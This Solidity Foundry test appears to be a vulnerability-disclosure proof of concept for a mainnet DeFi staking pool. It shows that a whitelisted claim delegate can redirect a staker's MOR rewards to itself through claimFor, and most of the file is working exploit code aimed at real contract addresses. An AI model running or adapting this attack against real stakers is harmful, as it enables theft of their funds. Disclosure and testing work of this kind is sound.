// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IStETH is IERC20 {
    function submit(address referral) external payable returns (uint256);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function setClaimSender(uint256 rewardPoolIndex_, address[] calldata senders_, bool[] calldata isAllowed_)
        external;
    function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
}

interface IChainLinkDataConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

/// @title MOR PoC A-01 — an approved claim delegate (setClaimSender) can redirect a
///        staker's MOR rewards to ANY address, because claimFor only honours a pinned
///        receiver when the staker set one; the default (no claimReceiver) lets the
///        delegate choose the mint destination. claimReferrerTierFor has no pinning
///        mechanism at all (same root cause, covered in the report text).
///
///        Fork: Ethereum mainnet, block 26460185.
///        Scaffolding disclosures (do not affect the vulnerable code path):
///        - The victim is a fresh key controlled by this test; on mainnet any real
///          staker who whitelisted a claim service is in the identical position.
///        - 40 stETH is donated to the Distributor so the stETH pool books yield in
///          the test window; on mainnet the same yield accrues from Lido rebasing.
///          The donation only sizes the victim's pending rewards; the theft works
///          for any pending amount.
///        - After the +15 day warp the real Chainlink answers are older than the
///          pools' allowedPriceUpdateDelay, so the consumer's answers are pinned
///          via mockCall to the exact values read live at the fork block. On
///          mainnet the feeds update continuously; the claim path is otherwise
///          executed entirely against the deployed contracts.
contract A01ClaimForRedirectionTest is Test {
    address internal constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address internal constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address internal constant CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    event UserClaimed(uint256 indexed rewardPoolIndex, address user, address receiver, uint256 amount);

    uint256 internal victimKey = 0xA011CE;
    uint256 internal attackerKey = 0xB0B;
    uint256 internal helperKey = 0xBEEF01;
    uint256 internal strangerKey = 0x57AA6;
    address internal victim;
    address internal attacker;
    address internal helper;

    function setUp() public {
        vm.createSelectFork("https://ethereum-rpc.publicnode.com", 26460185);
        victim = vm.addr(victimKey);
        attacker = vm.addr(attackerKey);
        helper = vm.addr(helperKey);
    }

    function _fundStEth(address who, uint256 ethAmount) internal returns (uint256 balance) {
        vm.deal(who, ethAmount);
        vm.prank(who);
        IStETH(STETH).submit{value: ethAmount}(address(0));
        balance = IERC20(STETH).balanceOf(who);
    }

    function _pinPrices() internal {
        IChainLinkDataConsumer consumer = IChainLinkDataConsumer(CONSUMER);
        string[5] memory paths = ["stETH/USD", "wETH/USD", "wBTC/BTC,BTC/USD", "USDC/USD", "USDT/USD"];
        for (uint256 i = 0; i < paths.length; i++) {
            bytes32 pathId = consumer.getPathId(paths[i]);
            uint256 answer = consumer.getChainLinkDataFeedLatestAnswer(pathId);
            require(answer > 0, "price read failed");
            vm.mockCall(
                CONSUMER,
                abi.encodeWithSelector(IChainLinkDataConsumer.getChainLinkDataFeedLatestAnswer.selector, pathId),
                abi.encode(answer)
            );
        }
    }

    function test_claimFor_approvedDelegateRedirectsRewards() public {
        IDepositPool pool = IDepositPool(STETH_POOL);

        // Victim stakes 4,000 stETH into public index 0.
        uint256 victimStEth = _fundStEth(victim, 4200 ether);
        // Distributor.supply pulls the stake directly from the user.
        vm.prank(victim);
        IERC20(STETH).approve(DISTRIBUTOR, victimStEth);
        vm.prank(victim);
        pool.stake(0, 4000 ether, 0, address(0));

        // Victim whitelists the attacker as a claim sender (the documented
        // "let a service trigger my claim" delegation) and does NOT pin a
        // claim receiver — the default state.
        address[] memory senders = new address[](1);
        senders[0] = attacker;
        bool[] memory allowed = new bool[](1);
        allowed[0] = true;
        vm.prank(victim);
        pool.setClaimSender(0, senders, allowed);

        // Scaffolding yield: helper donates 40 stETH to the Distributor.
        uint256 helperStEth = _fundStEth(helper, 45 ether);
        vm.prank(helper);
        IERC20(STETH).transfer(DISTRIBUTOR, 40 ether);
        require(helperStEth >= 40 ether, "helper funding short");

        // Pin oracle answers (see header), then let 15 days pass so the claim
        // lock (14 days) expires and a distribution runs.
        _pinPrices();
        vm.warp(block.timestamp + 15 days);
        IDistributor(DISTRIBUTOR).distributeRewards(0);

        uint256 pending = pool.getLatestUserReward(0, victim);
        emit log_named_uint("victim pending rewards (MOR wei)", pending);
        require(pending > 0, "no pending rewards accrued");

        // Control: a stranger who is NOT whitelisted cannot call claimFor.
        address stranger = vm.addr(strangerKey);
        vm.deal(stranger, 1 ether);
        vm.prank(stranger);
        vm.expectRevert(bytes("DS: invalid caller"));
        pool.claimFor{value: 0.1 ether}(0, victim, stranger);

        // ATTACK: the whitelisted delegate claims the victim's rewards to
        // THEMSELVES. The UserClaimed event records the mint destination.
        vm.deal(attacker, 1 ether);
        vm.recordLogs();
        vm.prank(attacker);
        pool.claimFor{value: 0.5 ether}(0, victim, attacker);

        Vm.Log[] memory logs = vm.getRecordedLogs();
        bool seen = false;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("UserClaimed(uint256,address,address,uint256)")) {
                // topics: [sig, rewardPoolIndex, user]; data: (receiver, amount)
                (address receiver, uint256 amount) = abi.decode(logs[i].data, (address, uint256));
                emit log_named_address("UserClaimed receiver", receiver);
                emit log_named_uint("UserClaimed amount (MOR wei)", amount);
                assertEq(receiver, attacker, "mint destination must be the attacker");
                assertEq(amount, pending, "full pending amount redirected");
                seen = true;
            }
        }
        assertTrue(seen, "UserClaimed event not found");
        assertEq(pool.getLatestUserReward(0, victim), 0, "victim pending must be zeroed");
    }
}
